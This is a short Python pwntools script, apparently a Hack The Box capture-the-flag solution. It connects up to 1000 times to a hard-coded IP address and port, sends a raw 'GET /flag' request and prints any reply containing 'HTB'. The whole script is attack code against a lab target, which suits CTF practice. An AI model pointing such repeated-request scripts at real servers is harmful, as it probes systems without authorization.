#!/usr/bin/python3
from pwn import *

context.log_level = 'error'

def connect_to(c):
	c.send(b"GET /flag \r\n\n")
	data = c.recv()
	if b"HTB" in data:
		print(data.decode())
		exit(0)

#print("[*]Working.....")
for _ in range(1000):
	c = connect("68.183.37.122", 32037)
	connect_to(c)